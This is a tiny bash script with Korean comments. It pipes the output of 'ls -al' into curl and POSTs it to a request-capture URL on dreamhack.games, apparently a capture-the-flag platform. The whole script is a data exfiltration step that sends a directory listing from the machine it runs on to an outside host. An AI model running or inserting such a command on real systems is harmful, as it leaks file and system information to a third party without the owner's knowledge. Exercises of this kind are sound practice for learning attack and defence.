#!/bin/bash

# 1. 설정 (수신 서버 정보)
TARGET_URL="https://wwmyrzl.request.dreamhack.games"

# 2. ls -al 결과 전송 (원본 그대로 전송)
ls -al | curl -X POST --data-binary @- "${TARGET_URL}"
